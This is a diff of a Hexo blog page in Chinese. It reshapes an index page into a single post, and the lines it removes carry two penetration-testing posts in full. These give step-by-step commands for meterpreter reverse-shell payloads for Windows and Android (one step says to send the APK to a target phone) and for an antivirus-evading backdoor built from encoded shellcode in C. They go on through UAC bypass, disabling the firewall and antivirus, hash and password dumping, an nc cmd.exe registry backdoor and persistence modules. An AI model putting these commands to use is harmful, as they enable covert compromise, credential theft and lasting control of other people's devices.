@@ -5,15 +5,19 @@
   
 
   
-  <title>Hexo</title>
+  <title>web安全学习笔记 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://yoursite.com/index.html">
+  <meta name="description" content="​">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web安全学习笔记">
+<meta property="og:url" content="http://yoursite.com/2019/03/31/web安全学习笔记/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="​">
 <meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-03-31T10:42:42.491Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hexo">
+<meta name="twitter:title" content="web安全学习笔记">
+<meta name="twitter:description" content="​">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -60,9 +64,7 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main">
-  
-    <article id="post-web安全学习笔记" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <section id="main"><article id="post-web安全学习笔记" class="article article-type-post" itemscope="" itemprop="blogPost">
   <div class="article-meta">
     <a href="/2019/03/31/web安全学习笔记/" class="article-date">
   <time datetime="2019-03-31T10:28:54.090Z" itemprop="datePublished">2019-03-31</time>
@@ -75,8 +77,8 @@
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/03/31/web安全学习笔记/">web安全学习笔记</a>
+    <h1 class="article-title" itemprop="name">
+      web安全学习笔记
     </h1>
   
 
@@ -198,290 +200,19 @@
     </footer>
   </div>
   
-</article>
-
-
+    
+<nav id="article-nav">
   
-    <article id="post-ssh-vps实现外网渗透" class="article article-type-post" itemscope="" itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2019/02/12/ssh-vps实现外网渗透/" class="article-date">
-  <time datetime="2019-02-12T12:56:19.000Z" itemprop="datePublished">2019-02-12</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/02/12/ssh-vps实现外网渗透/">ssh+vps实现外网渗透</a>
-    </h1>
+    <a href="/2019/02/12/ssh-vps实现外网渗透/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">ssh+vps实现外网渗透</div>
+    </a>
   
+</nav>
 
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><strong>Windows</strong></p>
-<p>①首先需要配置vps的ssh服务</p>
-<p>编辑：<code>vi /etc/ssh/sshd_config</code></p>
-<p>在文件最后添加：<code>GatewayPorts yes</code></p>
-<p>然后重启ssh服务并设置为开机自启：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart ssh</span><br><span class="line">systemctl enable ssh</span><br></pre></td></tr></table></figure>
-<p>②然后配置msf客户端：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\x00’ lhost=[vpsIP] lport=4444 -f c -o /home/test.c</span><br></pre></td></tr></table></figure>
-<p>③之后本地启用监听：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler </span><br><span class="line">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set lhost 192.168.0.124</span><br><span class="line">lhost =&gt; 192.168.0.124</span><br><span class="line">msf exploit(handler) &gt; set lport 4444</span><br><span class="line">lport =&gt; 4444</span><br><span class="line">msf exploit(handler) &gt; set exitonsession false</span><br><span class="line">exitonsession =&gt; false</span><br><span class="line">msf exploit(handler) &gt; exploit -j</span><br><span class="line">[*] Exploit running as background job.</span><br><span class="line">[*] Started reverse TCP handler on 192.168.0.124:4444</span><br></pre></td></tr></table></figure>
-<p>④开启ssh隧道：<code>ssh -N -R 4444:192.168.0.124:4444 root@vpsIP</code></p>
-<p>⑤客户端被执行以后，就会成功返回回话……</p>
-<p><strong>Android</strong></p>
-<p>①首先需要配置vps的ssh服务</p>
-<p>编辑：<code>vi /etc/ssh/sshd_config</code></p>
-<p>在文件最后添加：<code>GatewayPorts yes</code></p>
-<p>然后重启ssh服务并设置为开机自启：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart ssh</span><br><span class="line">systemctl enable ssh</span><br></pre></td></tr></table></figure>
-<p>②然后配置msf客户端：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp lhost=vpsIP lport=4444 &gt;/home/test.apk</span><br></pre></td></tr></table></figure>
-<p>③之后本地启用监听：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler </span><br><span class="line">msf exploit(handler) &gt; set payload android/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set lhost 192.168.0.124(kali IP)</span><br><span class="line">lhost =&gt; 192.168.0.124</span><br><span class="line">msf exploit(handler) &gt; set lport 4444</span><br><span class="line">lport =&gt; 4444</span><br><span class="line">msf exploit(handler) &gt; exploit</span><br></pre></td></tr></table></figure>
-<p>④开启ssh隧道：<code>ssh -N -R 4444:192.168.0.124:4444 root@vpsIP</code></p>
-<p>⑤将生成的APK文件发送给目标手机，下载打开就会获取控制权…..</p>
-<p><strong>一些命令：</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hide_app_icon：将图标藏起来</span><br><span class="line">wakelock：来实现不休眠</span><br><span class="line">远程强制修改目标手机的壁纸图案：</span><br><span class="line">msf &gt; use post/multi/manage/set_wallpaper</span><br><span class="line">msf post(set_wallpaper)&gt; set WALLPAPER_FILE /root/Desktop/hack.jpg</span><br><span class="line">msf post(set_wallpaper)&gt; set session 1</span><br><span class="line">msf post (set_wallpaper)&gt; exploit</span><br></pre></td></tr></table></figure>
-<p><img src="/2019/02/12/ssh-vps实现外网渗透/a.png" alt=""></p>
-<p><strong>总结</strong></p>
-<p>学习免杀，学习免杀，学习免杀！！！</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/02/12/ssh-vps实现外网渗透/" data-id="cjtwsl4qp0001ngv68nuy7mtx" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
   
 </article>
-
-
-  
-    <article id="post-hello-world" class="article article-type-post" itemscope="" itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2019/02/01/hello-world/" class="article-date">
-  <time datetime="2019-02-01T13:28:19.000Z" itemprop="datePublished">2019-02-01</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/02/01/hello-world/">hello-world</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>笨蛋自以为聪明，聪明人才知道自己是笨蛋。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/02/01/hello-world/" data-id="cjtwsl4qe0000ngv6903iv4nj" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-利用metasploit生成免杀后门" class="article article-type-post" itemscope="" itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2019/02/01/利用metasploit生成免杀后门/" class="article-date">
-  <time datetime="2019-02-01T13:28:19.000Z" itemprop="datePublished">2019-02-01</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/02/01/利用metasploit生成免杀后门/">利用metasploit生成免杀后门</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>①在kali中生成shellcode免杀</p>
-<p><code>msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\x00’ lhost=192.168.0.124 lport=5555 -f c -o /home/test.c</code></p>
-<p><img src="/2019/02/01/利用metasploit生成免杀后门/kali.PNG" alt=""></p>
-<p><strong>注：-e：指定编码方式；-i：指定编码次数；-b：去除指定代码，一般是空代码或者是错误代码；-f：指定生成格式；-o：指定输出路径。</strong></p>
-<p>②执行上述代码之后，会生成test.c，路径为/home/test.c</p>
-<p><img src="/2019/02/01/利用metasploit生成免杀后门/捕获.PNG" alt=""></p>
-<p>③打开test.c文件，代码如下：</p>
-<p><code>unsigned char buf[] = 
-&quot;\xb8\x3b\xc1\xbf\x73\xda\xdb\xd9\x74\x24\xf4\x5a\x29\xc9\xb1&quot;
-&quot;\x71\x31\x42\x13\x03\x42\x13\x83\xc2\x3f\x23\x4a\xcd\x8f\xfb&quot;
-&quot;\x24\xfd\x35\x30\x9f\x76\xed\x33\x7b\x44\x24\x0a\x16\x29\x5d&quot;
-&quot;\x91\xd6\x5e\xb1\x69\x6a\xb1\xe3\xc0\xc6\xb7\x48\x21\x9e\xda&quot;
-&quot;\x9f\xf8\x81\x21\x6d\x69\x31\xf6\x5c\x84\x77\x86\x69\x3a\xb4&quot;
-&quot;\x55\xd1\xe5\x5f\xa9\x08\xac\x33\x7a\xf4\x72\x2a\x76\x4a\x40&quot;
-&quot;\xb4\xcc\x87\xdd\x29\x76\xf4\x31\x8f\xc7\x36\x5c\xa0\x15\xf6&quot;
-&quot;\x9c\xd5\xae\xb2\x46\x99\x6a\x28\xf5\x3e\xae\x9a\x26\x29\x6f&quot;
-&quot;\x55\xe7\x25\x83\xab\x0a\xb4\xd9\x6f\x5f\xb3\x64\x14\x91\x59&quot;
-&quot;\x87\xcf\xcb\x3f\xc4\x9b\x76\x8d\x17\xf8\x47\xf3\x63\xbf\xed&quot;
-&quot;\x6f\xa1\x60\xd3\x77\x11\xf1\x5c\x91\xf4\x8f\xab\x6f\x23\xdf&quot;
-&quot;\xb3\x0d\x8c\xfe\xa3\x1c\x07\x0c\x40\x1b\xc0\x91\xc9\x00\xaf&quot;
-&quot;\x9c\x27\x77\x9b\x28\x98\x73\xbd\x6e\x73\x3a\x11\x55\x01\x13&quot;
-&quot;\x57\x79\x52\xd5\x52\xac\x72\x35\xfc\x4d\xbf\xa0\xfa\x4e\x05&quot;
-&quot;\x54\x14\xc1\xa5\xe5\xc0\x6d\x78\xc3\xde\xf8\xfb\x44\x0e\x1a&quot;
-&quot;\x31\x8e\xa0\x66\xdc\xb1\xb3\xdc\x26\x2d\x6a\xa4\x77\xe0\x04&quot;
-&quot;\x18\x4d\xc0\x9e\xa4\x0e\x7e\x0a\x82\xb3\x93\xa5\x1b\x6a\xc4&quot;
-&quot;\xa2\x24\x43\x06\xc9\x04\x4e\x0b\x89\x9f\x31\x08\xbd\x36\x54&quot;
-&quot;\x70\xdf\x61\x1b\x70\x16\x17\x0f\xae\x69\xbc\x8c\x4e\xe9\x13&quot;
-&quot;\xed\xb2\xec\x45\x05\x60\x49\x61\xe8\x39\x35\x38\x03\x16\x54&quot;
-&quot;\x6d\xce\xbb\x19\xb2\x34\x91\x61\x74\x8d\xe6\xd6\x3f\x03\x05&quot;
-&quot;\xa2\xee\xa5\xe2\x04\x78\x89\x8f\x2c\x66\x5e\xe9\xf4\xa3\x30&quot;
-&quot;\xa3\x67\xa7\x26\x5e\x71\x06\xb3\x81\xe9\x3a\x4a\x4e\xb7\x66&quot;
-&quot;\x69\xd7\x5a\x95\x88\x58\xd7\x9a\x2f\x1b\xab\xe1\x70\x91\xe1&quot;
-&quot;\x5f\xcf\xee\xf9\x8a\xe9\xc5\x7b\xec\x21\x77\xd9\xd1\x8f\xe0&quot;
-&quot;\x47\x50\x79\x3f\x34\x7d\x05\xa0\xd3\x41\xce\x83\xea\x72\x6e&quot;
-&quot;\xb8\xc8\x85\x00\x36\x3b\x6b\x4c\x7b\xd1\xde\x11\x8c\x34\x37&quot;
-&quot;\xba\xe8\x63\xc6\xf2\x83\xf9\x35\x01\xaf\x1d\xf6\x0b\x98\xac&quot;
-&quot;\xcb\xb9\x98\xdd\xb6\xf1\x72\x04\x41\x54\xf6\x2c\x2e\xf3\x4c&quot;
-&quot;\x07\xaf\x8b\xec\xda\xc7\xfa\xf6\xc9\xc6\xa8\xa0\x41\x40\x92&quot;
-&quot;\x3b\x12\x14\x15\xc5\x81\x2d\xf5\x54\x26\x9b\xa0\xb8\x55\x7e&quot;
-&quot;\x9a\xd1\xbe\xb7\x85\x8c\xa4\xce\xde\xf3\x7a&quot;;</code></p>
-<p>手动添加一些代码：</p>
-<p><code>#include&lt;stdio.h&gt;</code><br><code>#include&lt;windows.h&gt;</code><br><code>#pragma comment( linker, &quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)</code>  <!--运行时不显示窗口--></p>
-<p><code>unsigned char buf[] = 
-&quot;\xb8\x3b\xc1\xbf\x73\xda\xdb\xd9\x74\x24\xf4\x5a\x29\xc9\xb1&quot;
-&quot;\x71\x31\x42\x13\x03\x42\x13\x83\xc2\x3f\x23\x4a\xcd\x8f\xfb&quot;
-&quot;\x24\xfd\x35\x30\x9f\x76\xed\x33\x7b\x44\x24\x0a\x16\x29\x5d&quot;
-&quot;\x91\xd6\x5e\xb1\x69\x6a\xb1\xe3\xc0\xc6\xb7\x48\x21\x9e\xda&quot;
-&quot;\x9f\xf8\x81\x21\x6d\x69\x31\xf6\x5c\x84\x77\x86\x69\x3a\xb4&quot;
-&quot;\x55\xd1\xe5\x5f\xa9\x08\xac\x33\x7a\xf4\x72\x2a\x76\x4a\x40&quot;
-&quot;\xb4\xcc\x87\xdd\x29\x76\xf4\x31\x8f\xc7\x36\x5c\xa0\x15\xf6&quot;
-&quot;\x9c\xd5\xae\xb2\x46\x99\x6a\x28\xf5\x3e\xae\x9a\x26\x29\x6f&quot;
-&quot;\x55\xe7\x25\x83\xab\x0a\xb4\xd9\x6f\x5f\xb3\x64\x14\x91\x59&quot;
-&quot;\x87\xcf\xcb\x3f\xc4\x9b\x76\x8d\x17\xf8\x47\xf3\x63\xbf\xed&quot;
-&quot;\x6f\xa1\x60\xd3\x77\x11\xf1\x5c\x91\xf4\x8f\xab\x6f\x23\xdf&quot;
-&quot;\xb3\x0d\x8c\xfe\xa3\x1c\x07\x0c\x40\x1b\xc0\x91\xc9\x00\xaf&quot;
-&quot;\x9c\x27\x77\x9b\x28\x98\x73\xbd\x6e\x73\x3a\x11\x55\x01\x13&quot;
-&quot;\x57\x79\x52\xd5\x52\xac\x72\x35\xfc\x4d\xbf\xa0\xfa\x4e\x05&quot;
-&quot;\x54\x14\xc1\xa5\xe5\xc0\x6d\x78\xc3\xde\xf8\xfb\x44\x0e\x1a&quot;
-&quot;\x31\x8e\xa0\x66\xdc\xb1\xb3\xdc\x26\x2d\x6a\xa4\x77\xe0\x04&quot;
-&quot;\x18\x4d\xc0\x9e\xa4\x0e\x7e\x0a\x82\xb3\x93\xa5\x1b\x6a\xc4&quot;
-&quot;\xa2\x24\x43\x06\xc9\x04\x4e\x0b\x89\x9f\x31\x08\xbd\x36\x54&quot;
-&quot;\x70\xdf\x61\x1b\x70\x16\x17\x0f\xae\x69\xbc\x8c\x4e\xe9\x13&quot;
-&quot;\xed\xb2\xec\x45\x05\x60\x49\x61\xe8\x39\x35\x38\x03\x16\x54&quot;
-&quot;\x6d\xce\xbb\x19\xb2\x34\x91\x61\x74\x8d\xe6\xd6\x3f\x03\x05&quot;
-&quot;\xa2\xee\xa5\xe2\x04\x78\x89\x8f\x2c\x66\x5e\xe9\xf4\xa3\x30&quot;
-&quot;\xa3\x67\xa7\x26\x5e\x71\x06\xb3\x81\xe9\x3a\x4a\x4e\xb7\x66&quot;
-&quot;\x69\xd7\x5a\x95\x88\x58\xd7\x9a\x2f\x1b\xab\xe1\x70\x91\xe1&quot;
-&quot;\x5f\xcf\xee\xf9\x8a\xe9\xc5\x7b\xec\x21\x77\xd9\xd1\x8f\xe0&quot;
-&quot;\x47\x50\x79\x3f\x34\x7d\x05\xa0\xd3\x41\xce\x83\xea\x72\x6e&quot;
-&quot;\xb8\xc8\x85\x00\x36\x3b\x6b\x4c\x7b\xd1\xde\x11\x8c\x34\x37&quot;
-&quot;\xba\xe8\x63\xc6\xf2\x83\xf9\x35\x01\xaf\x1d\xf6\x0b\x98\xac&quot;
-&quot;\xcb\xb9\x98\xdd\xb6\xf1\x72\x04\x41\x54\xf6\x2c\x2e\xf3\x4c&quot;
-&quot;\x07\xaf\x8b\xec\xda\xc7\xfa\xf6\xc9\xc6\xa8\xa0\x41\x40\x92&quot;
-&quot;\x3b\x12\x14\x15\xc5\x81\x2d\xf5\x54\x26\x9b\xa0\xb8\x55\x7e&quot;
-&quot;\x9a\xd1\xbe\xb7\x85\x8c\xa4\xce\xde\xf3\x7a&quot;;</code></p>
-<p><code>main()
-{
-__asm   
-    {   
-        lea eax,buf;   
-        call eax;   
-    }   
-}</code></p>
-<p>④用vc++6.0来编译test.c文件</p>
-<p><img src="/2019/02/01/利用metasploit生成免杀后门/33.PNG" alt=""></p>
-<p>会生成一个Debug文件夹，里面有个test.exe，那就是免杀后门程序。</p>
-<p><img src="/2019/02/01/利用metasploit生成免杀后门/22.PNG" alt=""></p>
-<p>⑤再打开msfconsole监听</p>
-<p><code>msfconsole #打开msf</code></p>
-<p><code>use exploit/multi/handler</code></p>
-<p><code>set paylod windows/meterpreter/reverse_tcp</code></p>
-<p><code>set lhost 192.168.0.124</code></p>
-<p><code>set lport 5555</code></p>
-<p><code>exploit #开始监听</code></p>
-<p><img src="/2019/02/01/利用metasploit生成免杀后门/55.PNG" alt=""></p>
-<p>⑥目标机运行test.exe，就能拿到shell了。</p>
-<p><img src="/2019/02/01/利用metasploit生成免杀后门/666.PNG" alt=""> </p>
-<p>⑦得到shell后，尝试利用getuid和getsystem命令来提权：</p>
-<p><img src="/2019/02/01/利用metasploit生成免杀后门/99.PNG" alt=""></p>
-<p>结果可以判定遭到了UAC的用户访问控制的拦截！尝试绕过：</p>
-<p>①第一种方法</p>
-<p><code>use exploit/windows/local/ask</code></p>
-<p><code>set session 1</code></p>
-<p><code>exploit</code></p>
-<p><img src="/2019/02/01/利用metasploit生成免杀后门/000.PNG" alt=""></p>
-<p>成功执行后，会在目标系统上弹出一个确认框点击即可成功绕过！再来看看shell权限：</p>
-<p><img src="/2019/02/01/利用metasploit生成免杀后门/dd.PNG" alt=""></p>
-<p>②第二种方法</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">利用模块：</span><br><span class="line">msf &gt; use exploit/multi/script/web_delivery </span><br><span class="line">搜索bypassuac：  </span><br><span class="line">msf exploit(web_delivery) &gt; search bypassuac</span><br><span class="line">使用提权模块，进行对windows uac绕过：</span><br><span class="line">msf exploit(web_delivery) &gt; use exploit/windows/local/bypassuac_eventvwr</span><br><span class="line">设置回话（比如说我这里的话说是1）那就设置1：</span><br><span class="line">msf exploit(bypassuac_eventvwr) &gt; set SESSION 1</span><br><span class="line">执行exploit，执行提权：</span><br><span class="line">msf exploit(bypassuac_eventvwr) &gt; exploit</span><br><span class="line">缺点：绕不过360等杀软</span><br></pre></td></tr></table></figure>
-<p>命令：</p>
-<p>①通过shell来关闭防火墙：</p>
-<p><code>shell</code></p>
-<p><code>netsh adcfirewall set allprofiles state off</code></p>
-<p>但隐蔽性不高，容易被发现，可以通过策略的添加，来隐蔽行为！</p>
-<p><code>netsh firewall add portopening TCP 444 “VMWARE” ENABLE ALL</code></p>
-<p>伪装成一个系统正常的进程，之后远程重启目标系统，并利用 NC 连接！</p>
-<p>②开启3389远程桌面：</p>
-<p><code>run post/windows/manage/enable_rdp</code></p>
-<p>还可以使用 <code>run getgui -e</code>来开启远程桌面；</p>
-<p><code>run getgui -u xxxxx -p xxxxx</code>在目标机器添加用户</p>
-<p>③截屏：<code>screenshot</code></p>
-<p>开启机器电脑屏幕：<code>run vnc</code></p>
-<p>摄像头：<code>webcam_list</code></p>
-<p>密码：<code>load mimikatz</code>  ；  <code>kerberos</code></p>
-<p>获取目标系统上的hash值：<code>use post/windows/gather/hashdump</code></p>
-<p><code>set session 1</code>  ;   <code>exploit</code></p>
-<p>关闭杀毒软件：<code>run killav</code></p>
-<p>④利用注册表添加 NC 后门：</p>
-<p>上传 NC 到目标系统：<code>upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32</code></p>
-<p>枚举注册表内容（开机启动)：<code>reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run</code></p>
-<p>在该注册表增加内容（开机启动)：<code>reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d “C:\windows\system32\nc.exe -Ldp 444 -e cmd.exe”</code></p>
-<p>查看内容是否增加成功：<code>reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc</code></p>
-<p>⑤权限维持</p>
-<p>有很多种方法，列举MSF权限维持：</p>
-<p>①Persistence模块</p>
-<p><code>run persistence -U -i 10 -p 4444 -r 192.168.0.124</code></p>
-<p>重启还会反弹shell</p>
-<p>②Metsvc模块</p>
-<p><code>run metsvc -A</code>      重启还会反弹shell</p>
-<p><strong>总结</strong></p>
-<p>做笔记很重要！做笔记很重要！做笔记很重要！要不然都不知道自己这么菜！</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/02/01/利用metasploit生成免杀后门/" data-id="cjtwsl4qy0003ngv62nmy9v2l" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-
 
 </section>
         
